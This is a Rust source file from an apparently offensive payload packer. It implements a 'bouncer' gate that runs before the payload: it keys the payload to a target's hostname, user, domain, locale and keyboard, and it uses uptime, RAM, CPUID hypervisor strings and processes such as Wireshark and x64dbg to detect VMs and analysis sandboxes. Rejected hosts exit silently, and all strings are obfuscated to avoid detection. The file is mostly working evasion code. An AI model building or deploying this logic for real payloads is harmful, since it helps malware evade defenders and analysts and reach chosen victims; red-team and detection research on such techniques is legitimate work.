//! Bouncer: host environment gate.
//!
//! Checks the current host against a set of *declared* requirements (hostname,
//! user, domain, locale, keyboard layout, uptime, RAM, VM/sandbox heuristics)
//! and aborts the pipeline before the payload runs when they are not met. A
//! Preparation technique: it never runs the payload. See `README.md` for the
//! full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// How the declared checks combine.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Mode {
    /// Every declared check must pass for the payload to run (default).
    #[default]
    All,
    /// At least one declared check must pass for the payload to run.
    Any,
}

impl Mode {
    /// Whether a gate with these results lets the payload run.
    ///
    /// This is the reference for the logic the stub inlines into `bouncer()`
    /// (the fragment must stay self-contained, so it cannot call back into the
    /// packer). `declared` is how many checks the YAML enabled, `passed` how
    /// many of them succeeded; no declared check always continues.
    #[cfg(test)]
    pub fn accepts(self, declared: u32, passed: u32) -> bool {
        if declared == 0 {
            true
        } else if self == Mode::All {
            passed == declared
        } else {
            passed > 0
        }
    }
}

/// What the stub does when the gate rejects the host.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum OnFail {
    /// Exit silently (exit code 0, default).
    #[default]
    Silent,
    /// Exit with code 1.
    Exit,
}

/// Sandbox/analysis process names the `not_in_sandbox` heuristic looks for.
///
/// The list is deliberately small and well known (guest additions, packet
/// capture, Sysinternals process monitoring, the two mainstream user-mode
/// debuggers). Every entry is obfuscated at render time and never reaches
/// `.rdata` in cleartext.
pub const ANALYSIS_PROCESSES: &[&str] = &[
    "vboxservice.exe",
    "vmwaretray.exe",
    "vmtoolsd.exe",
    "wireshark.exe",
    "procmon.exe",
    "procmon64.exe",
    "x64dbg.exe",
    "x32dbg.exe",
];

/// Path/user-name fragments that point at an analysis environment.
pub const ANALYSIS_PATH_TOKENS: &[&str] = &["sandbox", "malware", "test", "analysis"];

/// Substrings of the CPUID leaf `0x40000000` hypervisor vendor that identify a
/// known hypervisor. Matching is a case-insensitive `contains` over the 12-byte
/// vendor string.
///
/// Sources for the vendor strings: VMware `VMwareVMware`, VirtualBox
/// `VBoxVBoxVBox`, Hyper-V `Microsoft Hv`, KVM `KVMKVMKVM`, Xen
/// `XenVMMXenVMM`, QEMU/TCG `TCGTCGTCGTCG`.
pub const HYPERVISOR_VENDOR_TOKENS: &[&str] =
    &["vmware", "vbox", "microsoft hv", "kvm", "xen", "tcg"];

/// Parameters for the bouncer gate.
///
/// Every field is optional. With no field declared the technique is a no-op
/// (it always lets the payload run); `picaro` warns about that at build time.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// How the declared checks combine (`all` or `any`).
    #[serde(default = "default_mode")]
    pub mode: Mode,

    /// Behaviour when the gate rejects the host (`silent` or `exit`).
    #[serde(default = "default_on_fail")]
    pub on_fail: OnFail,

    /// Required computer name. `*`/`?` make it a case-insensitive glob.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub hostname: Option<String>,

    /// Required user name. `*`/`?` make it a case-insensitive glob.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub username: Option<String>,

    /// Required DNS domain (empty when the host is not domain-joined, so the
    /// check then fails). `*`/`?` make it a case-insensitive glob.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub domain: Option<String>,

    /// Accepted BCP-47 locales (e.g. `en-US`, `es-ES`).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub language: Vec<String>,

    /// Accepted 4-digit keyboard layout codes (e.g. `0409`, `0C0A`).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub keyboard: Vec<String>,

    /// When `true`, require that no hypervisor vendor is reported by CPUID.
    /// `false` (or absent) skips the check.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub not_in_vm: Option<bool>,

    /// When `true`, require that the aggregate sandbox heuristic stays below its
    /// threshold. `false` (or absent) skips the check.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub not_in_sandbox: Option<bool>,

    /// Minimum system uptime in minutes.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub min_uptime_min: Option<u32>,

    /// Minimum physical memory in MiB.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub min_ram_mb: Option<u32>,
}

/// Default for [`Params::mode`]: every declared check must pass.
pub fn default_mode() -> Mode {
    Mode::All
}

/// Default for [`Params::on_fail`]: exit silently.
pub fn default_on_fail() -> OnFail {
    OnFail::Silent
}

/// Static metadata for the bouncer gate.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "bouncer",
    attck: &["T1497.001", "T1614.001"],
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Preparation,
    doc_path: "src/techniques/bouncer/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: r#"technique: bouncer
params:
  mode: all
  on_fail: silent
  hostname: "WORKSTATION-*"
  username: "admin"
  domain: "CORP"
  language: ["en-US", "es-ES"]
  keyboard: ["0409", "0C0A"]
  not_in_vm: true
  not_in_sandbox: true
  min_uptime_min: 10
  min_ram_mb: 4096
"#,
    // All checks use Win32 APIs directly; routing them through the syscall
    // layer is a later phase.
    syscalls: &[],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text lands in the generated stub's
/// `.rdata`. Each message is passed through the fragment's `win32_error` helper,
/// which appends the failing Win32 error code at the call site; the helper keeps
/// a keyword-free `format!` literal (`format!` cannot take a runtime format
/// string).
const MESSAGES: &[(&str, &str)] = &[
    (
        "$MSG_COMPUTER_NAME_FAILED$",
        "could not read the computer name",
    ),
    ("$MSG_USER_NAME_FAILED$", "could not read the user name"),
    ("$MSG_DOMAIN_FAILED$", "could not read the DNS domain"),
    ("$MSG_LOCALE_FAILED$", "could not read the user locale"),
    (
        "$MSG_KEYBOARD_FAILED$",
        "could not read the active keyboard layouts",
    ),
    (
        "$MSG_PROCESS_ENUM_FAILED$",
        "could not enumerate the running processes",
    ),
    (
        "$MSG_MEMORY_QUERY_FAILED$",
        "could not query the physical memory",
    ),
];

impl Params {
    /// Whether the gate declares no checks at all, so it can never reject a
    /// host. Surfaced as a build advisory by `plan::validate::advisories`.
    pub fn is_noop(&self) -> bool {
        self.hostname.is_none()
            && self.username.is_none()
            && self.domain.is_none()
            && self.language.is_empty()
            && self.keyboard.is_empty()
            && !self.requires_not_in_vm()
            && !self.requires_not_in_sandbox()
            && self.min_uptime_min.is_none()
            && self.min_ram_mb.is_none()
    }

    /// Whether the `not_in_vm` check is active (only `true` activates it).
    pub fn requires_not_in_vm(&self) -> bool {
        self.not_in_vm == Some(true)
    }

    /// Whether the `not_in_sandbox` check is active (only `true` activates it).
    pub fn requires_not_in_sandbox(&self) -> bool {
        self.not_in_sandbox == Some(true)
    }

    /// Renders the bouncer stub fragment for these parameters.
    ///
    /// Every per-build literal (the check patterns, the locale/keyboard lists
    /// and the built-in analysis-environment names) is emitted as code that
    /// rebuilds it at runtime through `strings`, so none of them lands in
    /// cleartext in the generated stub.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let mut fragment = DEF.stub_fragment.to_string();

        let substitutions = [
            ("$MODE_ALL$", (self.mode == Mode::All).to_string()),
            ("$ON_FAIL_EXIT$", (self.on_fail == OnFail::Exit).to_string()),
            ("$REQUIRE_NOT_VM$", self.requires_not_in_vm().to_string()),
            (
                "$REQUIRE_NOT_ANALYSIS_ENV$",
                self.requires_not_in_sandbox().to_string(),
            ),
            (
                "$HOSTNAME_DEF$",
                opt_string_def(self.hostname.as_deref(), strings, "hostname"),
            ),
            (
                "$USERNAME_DEF$",
                opt_string_def(self.username.as_deref(), strings, "username"),
            ),
            (
                "$DOMAIN_DEF$",
                opt_string_def(self.domain.as_deref(), strings, "domain"),
            ),
            (
                "$LANGUAGE_DEF$",
                list_def(&self.language, strings, "language"),
            ),
            (
                "$KEYBOARD_DEF$",
                list_def(&self.keyboard, strings, "keyboard"),
            ),
            (
                "$ANALYSIS_PROCESSES_DEF$",
                str_list_def(ANALYSIS_PROCESSES, strings, "env_process"),
            ),
            (
                "$ANALYSIS_PATH_TOKENS_DEF$",
                // The variable-name prefix must not spell a sensitive token: the
                // `stack` strategy emits it as an identifier in the stub source.
                str_list_def(ANALYSIS_PATH_TOKENS, strings, "env_token"),
            ),
            (
                "$VENDOR_TOKENS_DEF$",
                str_list_def(HYPERVISOR_VENDOR_TOKENS, strings, "vendor_token"),
            ),
            ("$MIN_UPTIME_DEF$", opt_u32_def(self.min_uptime_min)),
            ("$MIN_RAM_DEF$", opt_u32_def(self.min_ram_mb)),
        ];

        for (placeholder, value) in substitutions {
            fragment = fragment.replace(placeholder, &value);
        }
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            fragment = fragment.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("bouncer_msg_{index}")),
            );
        }
        fragment
    }
}

/// Case-insensitive glob match supporting `*` (any run) and `?` (one char).
///
/// This is the reference implementation for `hostname`/`username`/`domain`; the
/// stub carries a self-contained copy (`fn glob_match` in `stub_fragment.rs`)
/// because a fragment cannot call back into the packer. A pattern without
/// wildcards degenerates to an exact case-insensitive comparison.
#[cfg(test)]
pub fn glob_match(pattern: &str, text: &str) -> bool {
    let pattern: Vec<char> = pattern.to_lowercase().chars().collect();
    let text: Vec<char> = text.to_lowercase().chars().collect();

    let mut p = 0usize;
    let mut t = 0usize;
    let mut star: Option<usize> = None;
    let mut resume = 0usize;

    while t < text.len() {
        if p < pattern.len() && (pattern[p] == '?' || pattern[p] == text[t]) {
            p += 1;
            t += 1;
        } else if p < pattern.len() && pattern[p] == '*' {
            star = Some(p);
            resume = t;
            p += 1;
        } else if let Some(star_pos) = star {
            p = star_pos + 1;
            resume += 1;
            t = resume;
        } else {
            return false;
        }
    }

    // Trailing wildcards match the empty remainder.
    while p < pattern.len() && pattern[p] == '*' {
        p += 1;
    }
    p == pattern.len()
}

/// Renders an `Option<String>` placeholder as `Some(<runtime string>)` or `None`.
fn opt_string_def(value: Option<&str>, strings: &StringsConfig, name: &str) -> String {
    match value {
        Some(value) => format!("Some({})", strings.obfuscate(value).render_stub_expr(name)),
        None => "None".to_string(),
    }
}

/// Renders an `Option<u32>` placeholder.
fn opt_u32_def(value: Option<u32>) -> String {
    match value {
        Some(value) => format!("Some({value}u32)"),
        None => "None".to_string(),
    }
}

/// Renders a `Vec<String>` placeholder from the plan's `Vec<String>`.
fn list_def(values: &[String], strings: &StringsConfig, prefix: &str) -> String {
    let items: Vec<String> = values
        .iter()
        .enumerate()
        .map(|(i, value)| {
            strings
                .obfuscate(value)
                .render_stub_expr(&format!("{prefix}_{i}"))
        })
        .collect();
    format!("vec![{}]", items.join(", "))
}

/// Renders a `Vec<String>` placeholder from a static `&[&str]`.
fn str_list_def(values: &[&str], strings: &StringsConfig, prefix: &str) -> String {
    let items: Vec<String> = values
        .iter()
        .enumerate()
        .map(|(i, value)| {
            strings
                .obfuscate(value)
                .render_stub_expr(&format!("{prefix}_{i}"))
        })
        .collect();
    format!("vec![{}]", items.join(", "))
}

#[cfg(test)]
mod tests;
